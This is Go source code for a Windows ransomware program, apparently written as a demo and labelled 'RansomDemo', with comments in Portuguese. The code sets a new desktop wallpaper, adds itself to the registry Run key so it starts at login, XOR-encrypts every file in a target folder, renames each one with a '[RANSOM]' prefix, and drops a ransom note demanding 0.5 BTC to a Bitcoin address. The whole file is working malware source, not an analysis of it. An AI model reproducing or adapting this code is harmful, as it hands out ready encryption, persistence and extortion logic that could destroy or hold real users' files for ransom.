package main

import (
	_ "embed"
	"fmt"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

//go:embed wallpaper.png
var wallpaperData []byte

const (
	password             = "123"
	spiSetDeskWallpaper  = 0x0014
	spifUpdateIniFile    = 0x01
	spifSendWinIniChange = 0x02
	targetDir            = `C:\teste`
)

var (
	user32           = windows.NewLazySystemDLL("user32.dll")
	systemParameters = user32.NewProc("SystemParametersInfoW")
)

func xorEncrypt(data []byte) []byte {
	encrypted := make([]byte, len(data))
	for i := range data {
		encrypted[i] = data[i] ^ password[i%len(password)]
	}
	return encrypted
}

func setNewWallpaper() error {
	tempDir := os.TempDir()
	wallpaperPath := filepath.Join(tempDir, "wallpaper_temp.jpg")

	// Salvar wallpaper no temp
	if err := os.WriteFile(wallpaperPath, wallpaperData, 0644); err != nil {
		return fmt.Errorf("erro ao salvar wallpaper: %v", err)
	}

	// Definir wallpaper
	pathUTF16, err := windows.UTF16PtrFromString(wallpaperPath)
	if err != nil {
		return err
	}

	ret, _, _ := systemParameters.Call(
		uintptr(spiSetDeskWallpaper),
		0,
		uintptr(unsafe.Pointer(pathUTF16)),
		uintptr(spifUpdateIniFile|spifSendWinIniChange),
	)

	// Remover arquivo temporário
	os.Remove(wallpaperPath)

	if ret == 0 {
		return fmt.Errorf("falha ao definir wallpaper")
	}
	return nil
}

func addToStartup() {
	exePath := filepath.Join(targetDir, "encryptor.exe")
	key, _, err := registry.CreateKey(
		registry.CURRENT_USER,
		`Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.SET_VALUE,
	)
	if err != nil {
		return
	}
	defer key.Close()
	key.SetStringValue("RansomDemo", exePath)
}

func main() {
	os.MkdirAll(targetDir, 0755)

	if err := setNewWallpaper(); err != nil {
		fmt.Println("[ERRO]", err)
		return
	}

	addToStartup()

	// Criptografar arquivos (ignora diretórios e arquivos do sistema)
	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}

		data, _ := os.ReadFile(path)
		encryptedData := xorEncrypt(data)
		os.WriteFile(path, encryptedData, 0644)

		newName := "[RANSOM]" + info.Name() + ".aeehh"
		os.Rename(path, filepath.Join(filepath.Dir(path), newName))

		return nil
	})

	// Criar arquivo de aviso
	rescueNote := []byte(`
☠️ TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! ☠️
- PAGUE 0.5 BTC PARA: bc1qxy2kgdygjrsqtzq2n0yrf249fgw2q9u4h2d3tg`)
	os.WriteFile(filepath.Join(targetDir, "!!!WARNING!!!.txt"), rescueNote, 0644)

	fmt.Println("[+] Sistema comprometido. Chave de resgate:", password)
}
